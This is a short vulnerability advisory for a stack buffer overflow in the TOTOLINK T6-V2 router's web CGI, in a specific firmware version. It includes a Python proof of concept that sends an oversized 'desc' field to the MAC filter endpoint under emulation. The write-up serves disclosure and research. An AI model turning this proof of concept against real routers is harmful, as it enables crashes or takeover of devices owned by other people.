## Overview

- The device's official website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=products&id=16&ids=33
- Firmware download website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=16&ids=36

## Affected version

T6-V2 V4.1.9cu.5179_B20201015

## Vulnerability details

The vulnerability exists in the router's WEB component. `/web_cste/cgi-bin/cstecgi.cgi` `FUN_0041880c` (at address 0x41880c) gets the JSON parameter `desc`, but without checking its length, copies it directly to local variables in the stack, causing stack overflow: 

<img src="img/image-20220529112914215.png" alt="image-20220529112914215" style="zoom:67%;" />

## PoC

```python
from pwn import *
import json

data = {
    "topicurl": "setting/setMacFilterRules",
    "addEffect": "1",
    "enable": "1",
    "mac": "00:00:00:00:00:00",
    "desc": 'A'*0x400
}

data = json.dumps(data)
print(data)

argv = [
    "qemu-mipsel-static",
    "-g", "1234",
    "-L", "./root/",
    "-E", "CONTENT_LENGTH={}".format(len(data)),
    "-E", "REMOTE_ADDR=192.168.2.1",
    "./cstecgi.cgi"
]

a = process(argv=argv)
a.sendline(data.encode())

a.interactive()
```

